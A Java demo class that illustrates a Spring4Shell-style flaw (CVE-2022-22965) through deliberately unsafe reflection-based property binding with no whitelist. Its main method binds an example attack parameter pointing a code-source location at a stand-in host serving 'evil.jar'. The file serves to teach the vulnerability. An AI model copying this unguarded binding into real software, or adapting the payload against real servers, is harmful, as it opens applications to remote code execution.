package com.example.vuln;

import java.lang.reflect.Field;
import java.util.Map;

/**
 * Demonstrates a vulnerability similar to CVE-2022-22965 (Spring Framework RCE).
 * 
 * CVE-2022-22965 allows remote code execution through data binding in Spring Framework
 * by manipulating class loader properties and triggering arbitrary code execution.
 * 
 * This simplified example shows unsafe reflection-based property binding that could
 * allow an attacker to set arbitrary class properties via HTTP parameters.
 */
public class CVE202222965Demo {

    /**
     * Simulates unsafe object binding from HTTP parameters (as Spring does).
     * An attacker can inject properties like "classLoader.URLs" to achieve RCE.
     */
    public static void unsafePropertyBinding(Object target, Map<String, String> params) {
        try {
            for (Map.Entry<String, String> entry : params.entrySet()) {
                String propName = entry.getKey();
                String propValue = entry.getValue();

                // UNSAFE: directly use reflection to set properties without validation
                // Attackers can set nested properties like "class.protectionDomain.codeSource.location"
                setProperty(target, propName, propValue);
            }
        } catch (Exception e) {
            System.err.println("Error binding properties: " + e);
        }
    }

    /**
     * Naive property setter using reflection (similar to Spring's data binding).
     * Does not validate which properties can be set, allowing access to dangerous ones.
     */
    private static void setProperty(Object obj, String propPath, String value) throws Exception {
        String[] parts = propPath.split("\\.");
        Object current = obj;

        // Navigate through nested properties (e.g., "class.protectionDomain.codeSource")
        for (int i = 0; i < parts.length - 1; i++) {
            String part = parts[i];
            // UNSAFE: no whitelist of allowed properties
            Field field = findField(current.getClass(), part);
            if (field == null) {
                current = null;
                break;
            }
            field.setAccessible(true);
            current = field.get(current);
        }

        if (current != null) {
            String lastProp = parts[parts.length - 1];
            Field field = findField(current.getClass(), lastProp);
            if (field != null) {
                field.setAccessible(true);
                // UNSAFE: sets arbitrary properties including class loader properties
                field.set(current, value);
            }
        }
    }

    private static Field findField(Class<?> cls, String name) {
        try {
            return cls.getDeclaredField(name);
        } catch (NoSuchFieldException e) {
            // try superclass
            if (cls.getSuperclass() != null) {
                return findField(cls.getSuperclass(), name);
            }
            return null;
        }
    }

    /**
     * Demonstrates the vulnerability: an attacker sends HTTP params that get bound
     * to an object, potentially triggering RCE via class loader manipulation.
     */
    public static void main(String[] args) {
        // Simulate HTTP request with malicious parameters
        Map<String, String> attackParams = Map.of(
            "name", "attacker",
            "class.protectionDomain.codeSource.location", "http://attacker.com/evil.jar"
        );

        // Create a simple bean object (like a Spring Model object)
        SimpleBean bean = new SimpleBean();

        // Perform unsafe binding (simulating Spring's vulnerable data binding)
        unsafePropertyBinding(bean, attackParams);

        System.out.println("Bean name: " + bean.name);
        System.out.println("Binding complete (vulnerability demonstrated)");
    }

    /**
     * Simple bean class that would be bound in a Spring web application.
     */
    public static class SimpleBean {
        public String name;

        public SimpleBean() {
            this.name = "default";
        }
    }
}
